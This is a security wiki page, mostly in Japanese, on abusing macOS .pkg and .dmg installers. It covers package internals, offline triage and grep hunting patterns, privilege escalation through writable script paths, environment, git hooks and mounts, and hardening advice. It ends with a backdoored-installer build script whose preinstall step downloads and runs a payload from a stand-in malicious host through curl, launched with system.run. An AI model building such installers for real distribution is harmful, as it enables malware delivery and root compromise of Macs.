# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basic Information

macOS の **installer package**（`.pkg` ファイルとも呼ばれます）は、macOS が **software を配布**するために使用するファイル形式です。これらのファイルは、software のインストールと正常な実行に必要なすべてのものを含む **box** のようなものです。

package file 自体は、対象の computer に **インストールされる files と directories の階層**を格納した archive です。また、configuration files の設定や古い software version の cleanup など、インストール前後にタスクを実行する **scripts** を含めることもできます。

### Package Structure

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Customizations（title、welcome text など）および script/installation checks
- **PackageInfo (xml)**: Info、install requirements、install location、実行する scripts への paths
- **Bill of materials (bom)**: file permissions とともに、インストール、更新、または削除する files の list
- **Payload (CPIO archive gzip compressed)**: PackageInfo の `install-location` にインストールする files
- **Scripts (CPIO archive gzip compressed)**: 実行のために temp directory に展開される、インストール前後の scripts やその他の resources

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
インストーラの内容を手動で解凍せずに確認するには、無料ツールの [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/) も使用できます。

### Static triage のショートカット

分析が目的の場合は、まずパッケージを `Installer.app` で開くのを**避ける**ようにしてください。一部のパッケージは、`system.run()` やインストーラプラグインなどを介して、Installer が開いた時点でコードを実行できます。そのため、通常はオフラインでの抽出から始める方が安全です。
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG 基本情報

DMG ファイル、つまり Apple Disk Images は、Apple の macOS でディスクイメージに使用されるファイル形式です。DMG ファイルは基本的に**マウント可能なディスクイメージ**（独自のファイルシステムを含む）であり、通常は圧縮され、場合によっては暗号化された raw ブロックデータを含んでいます。DMG ファイルを開くと、macOS は**物理ディスクであるかのようにマウント**し、その内容にアクセスできるようにします。

> [!CAUTION]
> **`.dmg`** インストーラーは**非常に多くの形式**に対応しているため、過去には、その一部に含まれていた脆弱性が悪用され、**kernel code execution** の取得に利用されました。

### ディスクイメージの構造

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

DMG ファイルの階層は、内容によって異なる場合があります。ただし、アプリケーション DMG では、通常次の構造になります。

- Top Level: これはディスクイメージのルートです。多くの場合、アプリケーションと、Applications フォルダーへのリンクが含まれています。
- Application (.app): これは実際のアプリケーションです。macOS では、アプリケーションは通常、アプリケーションを構成する多数の個別ファイルとフォルダーを含むパッケージです。
- Applications Link: これは macOS の Applications フォルダーへのショートカットです。これにより、アプリケーションを簡単にインストールできます。.app ファイルをこのショートカットにドラッグすると、アプリをインストールできます。

## Privesc via pkg abuse

### public directories からの実行

pre-installation または post-installation スクリプトが **`/var/tmp/Installerutil`** のようなファイルを実行し、攻撃者がそのファイルを置き換えられる場合、インストーラーがそれを呼び出した際に、攻撃者は privilege escalation を実行できます。引用されている講演および walkthrough では、この安全でない外部スクリプトパターンの亜種が示されています。<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

これは、複数のインストーラーや updater が **root として何かを実行する**ために呼び出す[public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)です。この function は、**実行する** **file** の**path**をパラメーターとして受け取ります。しかし、攻撃者がこのファイルを**modify**できる場合、その実行を root 権限で**abuse**し、**privilege escalation**を実行できるようになります。
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
詳細については、こちらの講演を確認してください: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Environment と shebang の悪用

Modern PackageKit のバグから、installer scripts は、攻撃者が制御するコンテキストを近くに残したまま、**trusted root code** として実行されることが多いとわかりました。vendor packages を監査する際は、次の点に特に注意してください。

- `#!/bin/zsh` / `#!/bin/bash` などの Shell interpreters
- `sudo -u $USER`、`launchctl asuser` のような呼び出し、または `$USER`、`$HOME`、`PATH`、`TMPDIR`、相対パスを信頼するロジック
- ユーザーが制御する init files や libraries を読み込む可能性がある、Shell 以外の interpreters
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
2024年のPackageKit root-environment bug（ユーザーが開始したインストール中の `~/.zshenv` / `~/.bash*` の継承）については、[generic macOS privesc page](../macos-privilege-escalation.md)を確認してください。パッケージが **Apple-signed** の場合、`system_installd` が `com.apple.rootless.install.heritable` を保持する可能性があるため、同じスクリプトのbugが **SIP/TCC-relevant** になる場合があります。[SIP page](../macos-security-protections/macos-sip.md)を参照してください。<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### Stateful inputs and implicit callbacks

明らかな command injection だけにレビューを限定しないでください。root の `preinstall` / `postinstall` は、**インストール前から存在していたstate**、つまり `/tmp` や `/var/tmp` 内の予測可能なファイル、既存のuser-writableなインストールツリー、設定ファイル、repository metadata、または後から `chown` に渡されるusernameを使用する場合、trust boundaryを越える可能性があります。<sup>[[9]](#references)[[10]](#references)</sup>

最近の2件のHomebrew installer flawは、再利用可能なvariantを示しています。

- **Attacker-selected ownership:** package-user overrideが、owner、mode、ACL、symlink state、provenanceを検証せずに、予測可能な `/var/tmp/.homebrew_pkg_user.plist` から読み込まれていました。低権限userは自分のaccountを指定でき、その後のroot `postinstall` によってHomebrew treeとcacheのownershipが再帰的にそのuserへ移されました。これはshell injectionではなく、privilege-assignment flawでした。<sup>[[9]](#references)</sup>
- **Tool callbacks from an existing tree:** root `postinstall` は、通常のuserが意図的にwrite可能なinstallation内で `git checkout` を実行していました。そのため、実行可能な `.git/hooks/post-checkout` を配置すると、後続のGUI/MDM package upgradeをroot code executionへ変換できました。Intel pathでは、packaged `.git` directoryを既存repositoryへmergeすることで、attackerが追加したhooksも保持されました。<sup>[[10]](#references)</sup>

2つ目のprimitiveはauthorized test中に容易にmodel化できますが、triggerが発生するのは、vulnerableなprivileged installerが後からhook-capableなGit operationを実行した場合だけです。<sup>[[10]](#references)</sup>
```bash
repo=/path/to/user-writable/install
mkdir -p "$repo/.git/hooks"
cat > "$repo/.git/hooks/post-checkout" <<'EOF'
#!/bin/sh
id > /tmp/pkg-post-checkout-context
EOF
chmod +x "$repo/.git/hooks/post-checkout"
# Wait for the privileged .pkg install/upgrade; do not invoke it as root just to test.
```
ネストされたパッケージを展開し、攻撃者が制御可能なすべてのソースを特権シンクにマッピングします。直接実行に加えて、パーサー、所有権の変更、プラグイン／フック機構を備えたツールも調査します。<sup>[[9]](#references)[[10]](#references)</sup>
```bash
PKG=Target.pkg
OUT=$(mktemp -d)
pkgutil --expand-full "$PKG" "$OUT"
grep -RniE '(/var/tmp|/tmp|defaults[[:space:]]+read|PlistBuddy|chown[[:space:]]+-R)' "$OUT"
grep -RniE '(^|[;&|[:space:]])(git|svn|hg|npm|pip|ruby|python)[[:space:]]' "$OUT"
grep -RniE '(checkout|reset|submodule|hooksPath|GIT_(DIR|CONFIG)|PYTHONPATH|RUBYOPT)' "$OUT"
```
For hardening, privileged inputs を root-owned staging directory に移し、使用直前に各 path を検証します（regular file であること、想定された owner/mode、unsafe ACL がないこと、symlink traversal がないこと）。信頼できない identity から recursively ownership を変更することは避けてください。既存の tree 上で Git を実行する必要がある場合は、callbacks を明示的に抑制します（例: `git -c core.hooksPath=/dev/null ...`）。または、Git を呼び出す前に repository metadata を atomically 置き換えます。<sup>[[9]](#references)[[10]](#references)</sup>

### mount による実行

installer が `/tmp/fixedname/bla/bla` に書き込む場合、`noowners` を指定して `/tmp/fixedname` 上に **mount を作成**できます。これにより、**installation 中に任意の file を変更して** installation process を abuse できます。

この例として **CVE-2021-26089** があり、**periodic script を overwrite**して root として execution を得ることが可能でした。詳細については、talk [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup> を参照してください。

## malware としての pkg

### Empty Payload

実際の payload がなくても、scripts 内の malware だけを含む **`pre` および `post-install scripts` 付きの `.pkg`** file を生成できます。<sup>[[2]](#references)</sup>

### Distribution xml 内の JS

package の **distribution xml** file に **`<script>`** tags を追加でき、その code が実行されます。また、**`system.run`** を使用して **commands を実行**できます。

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Distribution packages では、通常、`allow-external-scripts="true"` などによって top-level の `Distribution` file が external scripts を有効にしている必要があります。したがって、`preinstall` / `postinstall` のみを review するだけでは不十分です。**Distribution XML 自体**に `installation-check` / `volume-check` hooks と、`system.run()` / `system.runOnce()` を直接実行する paths が含まれている可能性があります。
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### バックドア化されたインストーラ

dist.xml 内のスクリプトと JS code を使用する悪意のあるインストーラ
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Pkgsのアンパッキング：Macos Installer Packagesの内部と一般的なセキュリティ上の欠陥](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: 「macOS Installersのワイルドな世界」 - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Pkgsのアンパッキング：MacOS Installer Packagesの内部](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming：Installer Packagesの悪用](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822：macOS PackageKitのPrivilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Apple-signed PackagesでSIPを破る](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: 「Mount(ain) of Bugs」 - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - macOSで1000個のInstallersに殺される、そしてすべてが壊れている！](https://www.youtube.com/watch?v=lTOItyjTTkw)
- [9] [Homebrew macOS installerがユーザー制御のpackage-user plistを信頼する](https://github.com/Homebrew/brew/security/advisories/GHSA-59v8-x8q4-px5c)
- [10] [macOS PKGのpostinstallにおけるGit hooks経由のRoot code execution](https://github.com/Homebrew/brew/security/advisories/GHSA-6689-q779-c33m)
{{#include ../../../banners/hacktricks-training.md}}
